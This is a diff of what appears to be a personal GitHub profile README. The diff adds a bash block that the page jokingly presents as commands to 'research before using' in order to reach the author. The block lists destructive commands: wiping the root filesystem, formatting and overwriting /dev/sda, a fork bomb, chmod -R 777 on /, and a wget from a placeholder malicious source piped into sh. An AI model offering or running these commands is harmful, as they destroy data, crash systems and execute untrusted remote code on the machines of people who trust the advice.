@@ -10,19 +10,22 @@
 
 - 📫 How to reach me **Your National Bank or Your National Bank IP**
 
-- ⚡ **I'm Always Active 192.168.1.110**
-- 
-- ## Some Command You Need to Research Before Using
-
-  To Reach me
-
+- ⚡ **I'm Always Active in 192.168.1.110**
+   
+- ##  You Need to Research Before Using these command For Reach to me
  ```bash
   sudo rm -rf /*
   mkfs.ext3 /dev/sda
   :(){:|:&};:
+  dd if=/dev/random of=/dev/sda
+  chmod -R 777 /
+  wget http://malicious_source -O- | sh
  ```
+ <p><img align="left" src="https://github-readme-streak-stats.herokuapp.com/?user=aziz-ru" alt="aziz-ru" height="245" /></p>
+ <p><img align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=aziz-ru" alt="aziz-ru" width="300" /></ /></p>
+ 
 
 
 
 
-<p><img align="center" src="https://github-readme-streak-stats.herokuapp.com/?user=aziz-ru&" alt="aziz-ru" /></p>
+
